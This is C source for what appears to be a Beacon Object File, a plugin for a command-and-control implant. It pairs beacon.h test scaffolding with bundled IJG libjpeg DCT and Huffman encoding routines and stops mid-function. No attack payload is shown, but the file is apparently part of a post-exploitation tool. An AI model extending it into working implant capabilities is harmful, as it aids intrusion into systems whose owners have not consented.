#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include "../common/beacon.h"

#if BOF_TEST_MODE
#include <stdarg.h>

#define BeaconPrintf FakeBeaconPrintf
#define BeaconOutput FakeBeaconOutput

void FakeBeaconPrintf(int mode, const char* fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    vfprintf(stdout, fmt, args);
    va_end(args);
    putchar('\n');
}

void FakeBeaconOutput(int mode, const char* buf, int len)
{
    fwrite(buf, 1, len, stdout);
    putchar('\n');
}

#endif


/*
 * jfdctint.c
 *
 * Copyright (C) 1991-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains a slow-but-accurate integer implementation of the
 * forward DCT (Discrete Cosine Transform).
 *
 * A 2-D DCT can be done by 1-D DCT on each row followed by 1-D DCT
 * on each column.  Direct algorithms are also available, but they are
 * much more complex and seem not to be any faster when reduced to code.
 *
 * This implementation is based on an algorithm described in
 *   C. Loeffler, A. Ligtenberg and G. Moschytz, "Practical Fast 1-D DCT
 *   Algorithms with 11 Multiplications", Proc. Int'l. Conf. on Acoustics,
 *   Speech, and Signal Processing 1989 (ICASSP '89), pp. 988-991.
 * The primary algorithm described there uses 11 multiplies and 29 adds.
 * We use their alternate method with 12 multiplies and 32 adds.
 * The advantage of this method is that no data path contains more than one
 * multiplication; this allows a very simple and accurate implementation in
 * scaled fixed-point arithmetic, with a minimal number of shifts.
 */

#define JPEG_INTERNALS
#include "jinclude.h"
#include "jpeglib.h"
#include "jdct.h"		/* Private declarations for DCT subsystem */
#include "jchuff.h"		/* Declarations shared with jcphuff.c */

#ifdef DCT_ISLOW_SUPPORTED


/*
 * This module is specialized to the case DCTSIZE = 8.
 */

#if DCTSIZE != 8
  Sorry, this code only copes with 8x8 DCTs. /* deliberate syntax err */
#endif


/*
 * The poop on this scaling stuff is as follows:
 *
 * Each 1-D DCT step produces outputs which are a factor of sqrt(N)
 * larger than the true DCT outputs.  The final outputs are therefore
 * a factor of N larger than desired; since N=8 this can be cured by
 * a simple right shift at the end of the algorithm.  The advantage of
 * this arrangement is that we save two multiplications per 1-D DCT,
 * because the y0 and y4 outputs need not be divided by sqrt(N).
 * In the IJG code, this factor of 8 is removed by the quantization step
 * (in jcdctmgr.c), NOT in this module.
 *
 * We have to do addition and subtraction of the integer inputs, which
 * is no problem, and multiplication by fractional constants, which is
 * a problem to do in integer arithmetic.  We multiply all the constants
 * by CONST_SCALE and convert them to integer constants (thus retaining
 * CONST_BITS bits of precision in the constants).  After doing a
 * multiplication we have to divide the product by CONST_SCALE, with proper
 * rounding, to produce the correct output.  This division can be done
 * cheaply as a right shift of CONST_BITS bits.  We postpone shifting
 * as long as possible so that partial sums can be added together with
 * full fractional precision.
 *
 * The outputs of the first pass are scaled up by PASS1_BITS bits so that
 * they are represented to better-than-integral precision.  These outputs
 * require BITS_IN_JSAMPLE + PASS1_BITS + 3 bits; this fits in a 16-bit word
 * with the recommended scaling.  (For 12-bit sample data, the intermediate
 * array is INT32 anyway.)
 *
 * To avoid overflow of the 32-bit intermediate results in pass 2, we must
 * have BITS_IN_JSAMPLE + CONST_BITS + PASS1_BITS <= 26.  Error analysis
 * shows that the values given below are the most effective.
 */

#if BITS_IN_JSAMPLE == 8
#define CONST_BITS  13
#define PASS1_BITS  2
#else
#define CONST_BITS  13
#define PASS1_BITS  1		/* lose a little precision to avoid overflow */
#endif

/* Some C compilers fail to reduce "FIX(constant)" at compile time, thus
 * causing a lot of useless floating-point operations at run time.
 * To get around this we use the following pre-calculated constants.
 * If you change CONST_BITS you may want to add appropriate values.
 * (With a reasonable C compiler, you can just rely on the FIX() macro...)
 */

#if CONST_BITS == 13
#define FIX_0_298631336  ((INT32)  2446)	/* FIX(0.298631336) */
#define FIX_0_390180644  ((INT32)  3196)	/* FIX(0.390180644) */
#define FIX_0_541196100  ((INT32)  4433)	/* FIX(0.541196100) */
#define FIX_0_765366865  ((INT32)  6270)	/* FIX(0.765366865) */
#define FIX_0_899976223  ((INT32)  7373)	/* FIX(0.899976223) */
#define FIX_1_175875602  ((INT32)  9633)	/* FIX(1.175875602) */
#define FIX_1_501321110  ((INT32)  12299)	/* FIX(1.501321110) */
#define FIX_1_847759065  ((INT32)  15137)	/* FIX(1.847759065) */
#define FIX_1_961570560  ((INT32)  16069)	/* FIX(1.961570560) */
#define FIX_2_053119869  ((INT32)  16819)	/* FIX(2.053119869) */
#define FIX_2_562915447  ((INT32)  20995)	/* FIX(2.562915447) */
#define FIX_3_072711026  ((INT32)  25172)	/* FIX(3.072711026) */
#else
#define FIX_0_298631336  FIX(0.298631336)
#define FIX_0_390180644  FIX(0.390180644)
#define FIX_0_541196100  FIX(0.541196100)
#define FIX_0_765366865  FIX(0.765366865)
#define FIX_0_899976223  FIX(0.899976223)
#define FIX_1_175875602  FIX(1.175875602)
#define FIX_1_501321110  FIX(1.501321110)
#define FIX_1_847759065  FIX(1.847759065)
#define FIX_1_961570560  FIX(1.961570560)
#define FIX_2_053119869  FIX(2.053119869)
#define FIX_2_562915447  FIX(2.562915447)
#define FIX_3_072711026  FIX(3.072711026)
#endif


/* Multiply an INT32 variable by an INT32 constant to yield an INT32 result.
 * For 8-bit samples with the recommended scaling, all the variable
 * and constant values involved are no more than 16 bits wide, so a
 * 16x16->32 bit multiply can be used instead of a full 32x32 multiply.
 * For 12-bit samples, a full 32-bit multiplication will be needed.
 */

#if BITS_IN_JSAMPLE == 8
#define MULTIPLY(var,const)  MULTIPLY16C16(var,const)
#else
#define MULTIPLY(var,const)  ((var) * (const))
#endif


/*
 * Perform the forward DCT on one block of samples.
 */

GLOBAL(void)
jpeg_fdct_islow (DCTELEM * data)
{
  INT32 tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;
  INT32 tmp10, tmp11, tmp12, tmp13;
  INT32 z1, z2, z3, z4, z5;
  DCTELEM *dataptr;
  int ctr;
  SHIFT_TEMPS

  /* Pass 1: process rows. */
  /* Note results are scaled up by sqrt(8) compared to a true DCT; */
  /* furthermore, we scale the results by 2**PASS1_BITS. */

  dataptr = data;
  for (ctr = DCTSIZE-1; ctr >= 0; ctr--) {
    tmp0 = dataptr[0] + dataptr[7];
    tmp7 = dataptr[0] - dataptr[7];
    tmp1 = dataptr[1] + dataptr[6];
    tmp6 = dataptr[1] - dataptr[6];
    tmp2 = dataptr[2] + dataptr[5];
    tmp5 = dataptr[2] - dataptr[5];
    tmp3 = dataptr[3] + dataptr[4];
    tmp4 = dataptr[3] - dataptr[4];
    
    /* Even part per LL&M figure 1 --- note that published figure is faulty;
     * rotator "sqrt(2)*c1" should be "sqrt(2)*c6".
     */
    
    tmp10 = tmp0 + tmp3;
    tmp13 = tmp0 - tmp3;
    tmp11 = tmp1 + tmp2;
    tmp12 = tmp1 - tmp2;
    
    dataptr[0] = (DCTELEM) ((tmp10 + tmp11) << PASS1_BITS);
    dataptr[4] = (DCTELEM) ((tmp10 - tmp11) << PASS1_BITS);
    
    z1 = MULTIPLY(tmp12 + tmp13, FIX_0_541196100);
    dataptr[2] = (DCTELEM) DESCALE(z1 + MULTIPLY(tmp13, FIX_0_765366865),
				   CONST_BITS-PASS1_BITS);
    dataptr[6] = (DCTELEM) DESCALE(z1 + MULTIPLY(tmp12, - FIX_1_847759065),
				   CONST_BITS-PASS1_BITS);
    
    /* Odd part per figure 8 --- note paper omits factor of sqrt(2).
     * cK represents cos(K*pi/16).
     * i0..i3 in the paper are tmp4..tmp7 here.
     */
    
    z1 = tmp4 + tmp7;
    z2 = tmp5 + tmp6;
    z3 = tmp4 + tmp6;
    z4 = tmp5 + tmp7;
    z5 = MULTIPLY(z3 + z4, FIX_1_175875602); /* sqrt(2) * c3 */
    
    tmp4 = MULTIPLY(tmp4, FIX_0_298631336); /* sqrt(2) * (-c1+c3+c5-c7) */
    tmp5 = MULTIPLY(tmp5, FIX_2_053119869); /* sqrt(2) * ( c1+c3-c5+c7) */
    tmp6 = MULTIPLY(tmp6, FIX_3_072711026); /* sqrt(2) * ( c1+c3+c5-c7) */
    tmp7 = MULTIPLY(tmp7, FIX_1_501321110); /* sqrt(2) * ( c1+c3-c5-c7) */
    z1 = MULTIPLY(z1, - FIX_0_899976223); /* sqrt(2) * (c7-c3) */
    z2 = MULTIPLY(z2, - FIX_2_562915447); /* sqrt(2) * (-c1-c3) */
    z3 = MULTIPLY(z3, - FIX_1_961570560); /* sqrt(2) * (-c3-c5) */
    z4 = MULTIPLY(z4, - FIX_0_390180644); /* sqrt(2) * (c5-c3) */
    
    z3 += z5;
    z4 += z5;
    
    dataptr[7] = (DCTELEM) DESCALE(tmp4 + z1 + z3, CONST_BITS-PASS1_BITS);
    dataptr[5] = (DCTELEM) DESCALE(tmp5 + z2 + z4, CONST_BITS-PASS1_BITS);
    dataptr[3] = (DCTELEM) DESCALE(tmp6 + z2 + z3, CONST_BITS-PASS1_BITS);
    dataptr[1] = (DCTELEM) DESCALE(tmp7 + z1 + z4, CONST_BITS-PASS1_BITS);
    
    dataptr += DCTSIZE;		/* advance pointer to next row */
  }

  /* Pass 2: process columns.
   * We remove the PASS1_BITS scaling, but leave the results scaled up
   * by an overall factor of 8.
   */

  dataptr = data;
  for (ctr = DCTSIZE-1; ctr >= 0; ctr--) {
    tmp0 = dataptr[DCTSIZE*0] + dataptr[DCTSIZE*7];
    tmp7 = dataptr[DCTSIZE*0] - dataptr[DCTSIZE*7];
    tmp1 = dataptr[DCTSIZE*1] + dataptr[DCTSIZE*6];
    tmp6 = dataptr[DCTSIZE*1] - dataptr[DCTSIZE*6];
    tmp2 = dataptr[DCTSIZE*2] + dataptr[DCTSIZE*5];
    tmp5 = dataptr[DCTSIZE*2] - dataptr[DCTSIZE*5];
    tmp3 = dataptr[DCTSIZE*3] + dataptr[DCTSIZE*4];
    tmp4 = dataptr[DCTSIZE*3] - dataptr[DCTSIZE*4];
    
    /* Even part per LL&M figure 1 --- note that published figure is faulty;
     * rotator "sqrt(2)*c1" should be "sqrt(2)*c6".
     */
    
    tmp10 = tmp0 + tmp3;
    tmp13 = tmp0 - tmp3;
    tmp11 = tmp1 + tmp2;
    tmp12 = tmp1 - tmp2;
    
    dataptr[DCTSIZE*0] = (DCTELEM) DESCALE(tmp10 + tmp11, PASS1_BITS);
    dataptr[DCTSIZE*4] = (DCTELEM) DESCALE(tmp10 - tmp11, PASS1_BITS);
    
    z1 = MULTIPLY(tmp12 + tmp13, FIX_0_541196100);
    dataptr[DCTSIZE*2] = (DCTELEM) DESCALE(z1 + MULTIPLY(tmp13, FIX_0_765366865),
					   CONST_BITS+PASS1_BITS);
    dataptr[DCTSIZE*6] = (DCTELEM) DESCALE(z1 + MULTIPLY(tmp12, - FIX_1_847759065),
					   CONST_BITS+PASS1_BITS);
    
    /* Odd part per figure 8 --- note paper omits factor of sqrt(2).
     * cK represents cos(K*pi/16).
     * i0..i3 in the paper are tmp4..tmp7 here.
     */
    
    z1 = tmp4 + tmp7;
    z2 = tmp5 + tmp6;
    z3 = tmp4 + tmp6;
    z4 = tmp5 + tmp7;
    z5 = MULTIPLY(z3 + z4, FIX_1_175875602); /* sqrt(2) * c3 */
    
    tmp4 = MULTIPLY(tmp4, FIX_0_298631336); /* sqrt(2) * (-c1+c3+c5-c7) */
    tmp5 = MULTIPLY(tmp5, FIX_2_053119869); /* sqrt(2) * ( c1+c3-c5+c7) */
    tmp6 = MULTIPLY(tmp6, FIX_3_072711026); /* sqrt(2) * ( c1+c3+c5-c7) */
    tmp7 = MULTIPLY(tmp7, FIX_1_501321110); /* sqrt(2) * ( c1+c3-c5-c7) */
    z1 = MULTIPLY(z1, - FIX_0_899976223); /* sqrt(2) * (c7-c3) */
    z2 = MULTIPLY(z2, - FIX_2_562915447); /* sqrt(2) * (-c1-c3) */
    z3 = MULTIPLY(z3, - FIX_1_961570560); /* sqrt(2) * (-c3-c5) */
    z4 = MULTIPLY(z4, - FIX_0_390180644); /* sqrt(2) * (c5-c3) */
    
    z3 += z5;
    z4 += z5;
    
    dataptr[DCTSIZE*7] = (DCTELEM) DESCALE(tmp4 + z1 + z3,
					   CONST_BITS+PASS1_BITS);
    dataptr[DCTSIZE*5] = (DCTELEM) DESCALE(tmp5 + z2 + z4,
					   CONST_BITS+PASS1_BITS);
    dataptr[DCTSIZE*3] = (DCTELEM) DESCALE(tmp6 + z2 + z3,
					   CONST_BITS+PASS1_BITS);
    dataptr[DCTSIZE*1] = (DCTELEM) DESCALE(tmp7 + z1 + z4,
					   CONST_BITS+PASS1_BITS);
    
    dataptr++;			/* advance pointer to next column */
  }
}

#endif /* DCT_ISLOW_SUPPORTED */

/*
 * jfdctflt.c
 *
 * Copyright (C) 1994-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains a floating-point implementation of the
 * forward DCT (Discrete Cosine Transform).
 *
 * This implementation should be more accurate than either of the integer
 * DCT implementations.  However, it may not give the same results on all
 * machines because of differences in roundoff behavior.  Speed will depend
 * on the hardware's floating point capacity.
 *
 * A 2-D DCT can be done by 1-D DCT on each row followed by 1-D DCT
 * on each column.  Direct algorithms are also available, but they are
 * much more complex and seem not to be any faster when reduced to code.
 *
 * This implementation is based on Arai, Agui, and Nakajima's algorithm for
 * scaled DCT.  Their original paper (Trans. IEICE E-71(11):1095) is in
 * Japanese, but the algorithm is described in the Pennebaker & Mitchell
 * JPEG textbook (see REFERENCES section in file README).  The following code
 * is based directly on figure 4-8 in P&M.
 * While an 8-point DCT cannot be done in less than 11 multiplies, it is
 * possible to arrange the computation so that many of the multiplies are
 * simple scalings of the final outputs.  These multiplies can then be
 * folded into the multiplications or divisions by the JPEG quantization
 * table entries.  The AA&N method leaves only 5 multiplies and 29 adds
 * to be done in the DCT itself.
 * The primary disadvantage of this method is that with a fixed-point
 * implementation, accuracy is lost due to imprecise representation of the
 * scaled quantization values.  However, that problem does not arise if
 * we use floating point arithmetic.
 */

#ifdef DCT_FLOAT_SUPPORTED


/*
 * This module is specialized to the case DCTSIZE = 8.
 */

#if DCTSIZE != 8
  Sorry, this code only copes with 8x8 DCTs. /* deliberate syntax err */
#endif


/*
 * Perform the forward DCT on one block of samples.
 */

GLOBAL(void)
jpeg_fdct_float (FAST_FLOAT * data)
{
  FAST_FLOAT tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;
  FAST_FLOAT tmp10, tmp11, tmp12, tmp13;
  FAST_FLOAT z1, z2, z3, z4, z5, z11, z13;
  FAST_FLOAT *dataptr;
  int ctr;

  /* Pass 1: process rows. */

  dataptr = data;
  for (ctr = DCTSIZE-1; ctr >= 0; ctr--) {
    tmp0 = dataptr[0] + dataptr[7];
    tmp7 = dataptr[0] - dataptr[7];
    tmp1 = dataptr[1] + dataptr[6];
    tmp6 = dataptr[1] - dataptr[6];
    tmp2 = dataptr[2] + dataptr[5];
    tmp5 = dataptr[2] - dataptr[5];
    tmp3 = dataptr[3] + dataptr[4];
    tmp4 = dataptr[3] - dataptr[4];
    
    /* Even part */
    
    tmp10 = tmp0 + tmp3;	/* phase 2 */
    tmp13 = tmp0 - tmp3;
    tmp11 = tmp1 + tmp2;
    tmp12 = tmp1 - tmp2;
    
    dataptr[0] = tmp10 + tmp11; /* phase 3 */
    dataptr[4] = tmp10 - tmp11;
    
    z1 = (tmp12 + tmp13) * ((FAST_FLOAT) 0.707106781); /* c4 */
    dataptr[2] = tmp13 + z1;	/* phase 5 */
    dataptr[6] = tmp13 - z1;
    
    /* Odd part */

    tmp10 = tmp4 + tmp5;	/* phase 2 */
    tmp11 = tmp5 + tmp6;
    tmp12 = tmp6 + tmp7;

    /* The rotator is modified from fig 4-8 to avoid extra negations. */
    z5 = (tmp10 - tmp12) * ((FAST_FLOAT) 0.382683433); /* c6 */
    z2 = ((FAST_FLOAT) 0.541196100) * tmp10 + z5; /* c2-c6 */
    z4 = ((FAST_FLOAT) 1.306562965) * tmp12 + z5; /* c2+c6 */
    z3 = tmp11 * ((FAST_FLOAT) 0.707106781); /* c4 */

    z11 = tmp7 + z3;		/* phase 5 */
    z13 = tmp7 - z3;

    dataptr[5] = z13 + z2;	/* phase 6 */
    dataptr[3] = z13 - z2;
    dataptr[1] = z11 + z4;
    dataptr[7] = z11 - z4;

    dataptr += DCTSIZE;		/* advance pointer to next row */
  }

  /* Pass 2: process columns. */

  dataptr = data;
  for (ctr = DCTSIZE-1; ctr >= 0; ctr--) {
    tmp0 = dataptr[DCTSIZE*0] + dataptr[DCTSIZE*7];
    tmp7 = dataptr[DCTSIZE*0] - dataptr[DCTSIZE*7];
    tmp1 = dataptr[DCTSIZE*1] + dataptr[DCTSIZE*6];
    tmp6 = dataptr[DCTSIZE*1] - dataptr[DCTSIZE*6];
    tmp2 = dataptr[DCTSIZE*2] + dataptr[DCTSIZE*5];
    tmp5 = dataptr[DCTSIZE*2] - dataptr[DCTSIZE*5];
    tmp3 = dataptr[DCTSIZE*3] + dataptr[DCTSIZE*4];
    tmp4 = dataptr[DCTSIZE*3] - dataptr[DCTSIZE*4];
    
    /* Even part */
    
    tmp10 = tmp0 + tmp3;	/* phase 2 */
    tmp13 = tmp0 - tmp3;
    tmp11 = tmp1 + tmp2;
    tmp12 = tmp1 - tmp2;
    
    dataptr[DCTSIZE*0] = tmp10 + tmp11; /* phase 3 */
    dataptr[DCTSIZE*4] = tmp10 - tmp11;
    
    z1 = (tmp12 + tmp13) * ((FAST_FLOAT) 0.707106781); /* c4 */
    dataptr[DCTSIZE*2] = tmp13 + z1; /* phase 5 */
    dataptr[DCTSIZE*6] = tmp13 - z1;
    
    /* Odd part */

    tmp10 = tmp4 + tmp5;	/* phase 2 */
    tmp11 = tmp5 + tmp6;
    tmp12 = tmp6 + tmp7;

    /* The rotator is modified from fig 4-8 to avoid extra negations. */
    z5 = (tmp10 - tmp12) * ((FAST_FLOAT) 0.382683433); /* c6 */
    z2 = ((FAST_FLOAT) 0.541196100) * tmp10 + z5; /* c2-c6 */
    z4 = ((FAST_FLOAT) 1.306562965) * tmp12 + z5; /* c2+c6 */
    z3 = tmp11 * ((FAST_FLOAT) 0.707106781); /* c4 */

    z11 = tmp7 + z3;		/* phase 5 */
    z13 = tmp7 - z3;

    dataptr[DCTSIZE*5] = z13 + z2; /* phase 6 */
    dataptr[DCTSIZE*3] = z13 - z2;
    dataptr[DCTSIZE*1] = z11 + z4;
    dataptr[DCTSIZE*7] = z11 - z4;

    dataptr++;			/* advance pointer to next column */
  }
}

#endif /* DCT_FLOAT_SUPPORTED */
/*
 * jchuff.c
 *
 * Copyright (C) 1991-1997, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains Huffman entropy encoding routines.
 *
 * Much of the complexity here has to do with supporting output suspension.
 * If the data destination module demands suspension, we want to be able to
 * back up to the start of the current MCU.  To do this, we copy state
 * variables into local working storage, and update them back to the
 * permanent JPEG objects only upon successful completion of an MCU.
 */

/* Expanded entropy encoder object for Huffman encoding.
 *
 * The savable_state subrecord contains fields that change within an MCU,
 * but must not be updated permanently until we complete the MCU.
 */

typedef struct {
  INT32 put_buffer;		/* current bit-accumulation buffer */
  int put_bits;			/* # of bits now in it */
  int last_dc_val[MAX_COMPS_IN_SCAN]; /* last DC coef for each component */
} savable_state;

/* This macro is to work around compilers with missing or broken
 * structure assignment.  You'll need to fix this code if you have
 * such a compiler and you change MAX_COMPS_IN_SCAN.
 */

#ifndef NO_STRUCT_ASSIGN
#define ASSIGN_STATE(dest,src)  ((dest) = (src))
#else
#if MAX_COMPS_IN_SCAN == 4
#define ASSIGN_STATE(dest,src)  \
	((dest).put_buffer = (src).put_buffer, \
	 (dest).put_bits = (src).put_bits, \
	 (dest).last_dc_val[0] = (src).last_dc_val[0], \
	 (dest).last_dc_val[1] = (src).last_dc_val[1], \
	 (dest).last_dc_val[2] = (src).last_dc_val[2], \
	 (dest).last_dc_val[3] = (src).last_dc_val[3])
#endif
#endif


typedef struct {
  struct jpeg_entropy_encoder pub; /* public fields */

  savable_state saved;		/* Bit buffer & DC state at start of MCU */

  /* These fields are NOT loaded into local working state. */
  unsigned int restarts_to_go;	/* MCUs left in this restart interval */
  int next_restart_num;		/* next restart number to write (0-7) */

  /* Pointers to derived tables (these workspaces have image lifespan) */
  c_derived_tbl * dc_derived_tbls[NUM_HUFF_TBLS];
  c_derived_tbl * ac_derived_tbls[NUM_HUFF_TBLS];

#ifdef ENTROPY_OPT_SUPPORTED	/* Statistics tables for optimization */
  long * dc_count_ptrs[NUM_HUFF_TBLS];
  long * ac_count_ptrs[NUM_HUFF_TBLS];
#endif
} huff_entropy_encoder;

typedef huff_entropy_encoder * huff_entropy_ptr;

/* Working state while writing an MCU.
 * This struct contains all the fields that are needed by subroutines.
 */

typedef struct {
  JOCTET * next_output_byte;	/* => next byte to write in buffer */
  size_t free_in_buffer;	/* # of byte spaces remaining in buffer */
  savable_state cur;		/* Current bit buffer & DC state */
  j_compress_ptr cinfo;		/* dump_buffer needs access to this */
} working_state;


/* Forward declarations */
METHODDEF(boolean) encode_mcu_huff JPP((j_compress_ptr cinfo,
					JBLOCKROW *MCU_data));
METHODDEF(void) finish_pass_huff JPP((j_compress_ptr cinfo));
#ifdef ENTROPY_OPT_SUPPORTED
METHODDEF(boolean) encode_mcu_gather JPP((j_compress_ptr cinfo,
					  JBLOCKROW *MCU_data));
METHODDEF(void) finish_pass_gather JPP((j_compress_ptr cinfo));
#endif


/*
 * Initialize for a Huffman-compressed scan.
 * If gather_statistics is TRUE, we do not output anything during the scan,
 * just count the Huffman symbols used and generate Huffman code tables.
 */

METHODDEF(void)
start_pass_huff (j_compress_ptr cinfo, boolean gather_statistics)
{
  huff_entropy_ptr entropy = (huff_entropy_ptr) cinfo->entropy;
  int ci, dctbl, actbl;
  jpeg_component_info * compptr;

  if (gather_statistics) {
#ifdef ENTROPY_OPT_SUPPORTED
    entropy->pub.encode_mcu = encode_mcu_gather;
    entropy->pub.finish_pass = finish_pass_gather;
#else
    ERREXIT(cinfo, JERR_NOT_COMPILED);
#endif
  } else {
    entropy->pub.encode_mcu = encode_mcu_huff;
    entropy->pub.finish_pass = finish_pass_huff;
  }

  for (ci = 0; ci < cinfo->comps_in_scan; ci++) {
    compptr = cinfo->cur_comp_info[ci];
    dctbl = compptr->dc_tbl_no;
    actbl = compptr->ac_tbl_no;
    if (gather_statistics) {
#ifdef ENTROPY_OPT_SUPPORTED
      /* Check for invalid table indexes */
      /* (make_c_derived_tbl does this in the other path) */
      if (dctbl < 0 || dctbl >= NUM_HUFF_TBLS)
	ERREXIT1(cinfo, JERR_NO_HUFF_TABLE, dctbl);
      if (actbl < 0 || actbl >= NUM_HUFF_TBLS)
	ERREXIT1(cinfo, JERR_NO_HUFF_TABLE, actbl);
      /* Allocate and zero the statistics tables */
      /* Note that jpeg_gen_optimal_table expects 257 entries in each table! */
      if (entropy->dc_count_ptrs[dctbl] == NULL)
	entropy->dc_count_ptrs[dctbl] = (long *)
	  (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				      257 * SIZEOF(long));
      MEMZERO(entropy->dc_count_ptrs[dctbl], 257 * SIZEOF(long));
      if (entropy->ac_count_ptrs[actbl] == NULL)
	entropy->ac_count_ptrs[actbl] = (long *)
	  (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				      257 * SIZEOF(long));
      MEMZERO(entropy->ac_count_ptrs[actbl], 257 * SIZEOF(long));
#endif
    } else {
      /* Compute derived values for Huffman tables */
      /* We may do this more than once for a table, but it's not expensive */
      jpeg_make_c_derived_tbl(cinfo, TRUE, dctbl,
			      & entropy->dc_derived_tbls[dctbl]);
      jpeg_make_c_derived_tbl(cinfo, FALSE, actbl,
			      & entropy->ac_derived_tbls[actbl]);
    }
    /* Initialize DC predictions to 0 */
    entropy->saved.last_dc_val[ci] = 0;
  }

  /* Initialize bit buffer to empty */
  entropy->saved.put_buffer = 0;
  entropy->saved.put_bits = 0;

  /* Initialize restart stuff */
  entropy->restarts_to_go = cinfo->restart_interval;
  entropy->next_restart_num = 0;
}


/*
 * Compute the derived values for a Huffman table.
 * This routine also performs some validation checks on the table.
 *
 * Note this is also used by jcphuff.c.
 */

GLOBAL(void)
jpeg_make_c_derived_tbl (j_compress_ptr cinfo, boolean isDC, int tblno,
			 c_derived_tbl ** pdtbl)
{
  JHUFF_TBL *htbl;
  c_derived_tbl *dtbl;
  int p, i, l, lastp, si, maxsymbol;
  char huffsize[257];
  unsigned int huffcode[257];
  unsigned int code;

  /* Note that huffsize[] and huffcode[] are filled in code-length order,
   * paralleling the order of the symbols themselves in htbl->huffval[].
   */

  /* Find the input Huffman table */
  if (tblno < 0 || tblno >= NUM_HUFF_TBLS)
    ERREXIT1(cinfo, JERR_NO_HUFF_TABLE, tblno);
  htbl =
    isDC ? cinfo->dc_huff_tbl_ptrs[tblno] : cinfo->ac_huff_tbl_ptrs[tblno];
  if (htbl == NULL)
    ERREXIT1(cinfo, JERR_NO_HUFF_TABLE, tblno);

  /* Allocate a workspace if we haven't already done so. */
  if (*pdtbl == NULL)
    *pdtbl = (c_derived_tbl *)
      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				  SIZEOF(c_derived_tbl));
  dtbl = *pdtbl;
  
  /* Figure C.1: make table of Huffman code length for each symbol */

  p = 0;
  for (l = 1; l <= 16; l++) {
    i = (int) htbl->bits[l];
    if (i < 0 || p + i > 256)	/* protect against table overrun */
      ERREXIT(cinfo, JERR_BAD_HUFF_TABLE);
    while (i--)
      huffsize[p++] = (char) l;
  }
  huffsize[p] = 0;
  lastp = p;
  
  /* Figure C.2: generate the codes themselves */
  /* We also validate that the counts represent a legal Huffman code tree. */

  code = 0;
  si = huffsize[0];
  p = 0;
  while (huffsize[p]) {
    while (((int) huffsize[p]) == si) {
      huffcode[p++] = code;
      code++;
    }
    /* code is now 1 more than the last code used for codelength si; but
     * it must still fit in si bits, since no code is allowed to be all ones.
     */
    if (((INT32) code) >= (((INT32) 1) << si))
      ERREXIT(cinfo, JERR_BAD_HUFF_TABLE);
    code <<= 1;
    si++;
  }
  
  /* Figure C.3: generate encoding tables */
  /* These are code and size indexed by symbol value */

  /* Set all codeless symbols to have code length 0;
   * this lets us detect duplicate VAL entries here, and later
   * allows emit_bits to detect any attempt to emit such symbols.
   */
  MEMZERO(dtbl->ehufsi, SIZEOF(dtbl->ehufsi));

  /* This is also a convenient place to check for out-of-range
   * and duplicated VAL entries.  We allow 0..255 for AC symbols
   * but only 0..15 for DC.  (We could constrain them further
   * based on data depth and mode, but this seems enough.)
   */
  maxsymbol = isDC ? 15 : 255;

  for (p = 0; p < lastp; p++) {
    i = htbl->huffval[p];
    if (i < 0 || i > maxsymbol || dtbl->ehufsi[i])
      ERREXIT(cinfo, JERR_BAD_HUFF_TABLE);
    dtbl->ehufco[i] = huffcode[p];
    dtbl->ehufsi[i] = huffsize[p];
  }
}


/* Outputting bytes to the file */

/* Emit a byte, taking 'action' if must suspend. */
#define emit_byte(state,val,action)  \
	{ *(state)->next_output_byte++ = (JOCTET) (val);  \
	  if (--(state)->free_in_buffer == 0)  \
	    if (! dump_buffer(state))  \
	      { action; } }


LOCAL(boolean)
dump_buffer (working_state * state)
/* Empty the output buffer; return TRUE if successful, FALSE if must suspend */
{
  struct jpeg_destination_mgr * dest = state->cinfo->dest;

  if (! (*dest->empty_output_buffer) (state->cinfo))
    return FALSE;
  /* After a successful buffer dump, must reset buffer pointers */
  state->next_output_byte = dest->next_output_byte;
  state->free_in_buffer = dest->free_in_buffer;
  return TRUE;
}


/* Outputting bits to the file */

/* Only the right 24 bits of put_buffer are used; the valid bits are
 * left-justified in this part.  At most 16 bits can be passed to emit_bits
 * in one call, and we never retain more than 7 bits in put_buffer
 * between calls, so 24 bits are sufficient.
 */

INLINE
LOCAL(boolean)
emit_bits (working_state * state, unsigned int code, int size)
/* Emit some bits; return TRUE if successful, FALSE if must suspend */
{
  /* This routine is heavily used, so it's worth coding tightly. */
  INT32 put_buffer = (INT32) code;
  int put_bits = state->cur.put_bits;

  /* if size is 0, caller used an invalid Huffman table entry */
  if (size == 0)
    ERREXIT(state->cinfo, JERR_HUFF_MISSING_CODE);

  put_buffer &= (((INT32) 1)<<size) - 1; /* mask off any extra bits in code */
  
  put_bits += size;		/* new number of bits in buffer */
  
  put_buffer <<= 24 - put_bits; /* align incoming bits */

  put_buffer |= state->cur.put_buffer; /* and merge with old buffer contents */
  
  while (put_bits >= 8) {
    int c = (int) ((put_buffer >> 16) & 0xFF);
    
    emit_byte(state, c, return FALSE);
    if (c == 0xFF) {		/* need to stuff a zero byte? */
      emit_byte(state, 0, return FALSE);
    }
    put_buffer <<= 8;
    put_bits -= 8;
  }

  state->cur.put_buffer = put_buffer; /* update state variables */
  state->cur.put_bits = put_bits;

  return TRUE;
}


LOCAL(boolean)
flush_bits (working_state * state)
{
  if (! emit_bits(state, 0x7F, 7)) /* fill any partial byte with ones */
    return FALSE;
  state->cur.put_buffer = 0;	/* and reset bit-buffer to empty */
  state->cur.put_bits = 0;
  return TRUE;
}


/* Encode a single block's worth of coefficients */

LOCAL(boolean)
encode_one_block (working_state * state, JCOEFPTR block, int last_dc_val,
		  c_derived_tbl *dctbl, c_derived_tbl *actbl)
{
  int temp, temp2;
  int nbits;
  int k, r, i;
  
  /* Encode the DC coefficient difference per section F.1.2.1 */
  
  temp = temp2 = block[0] - last_dc_val;

  if (temp < 0) {
    temp = -temp;		/* temp is abs value of input */
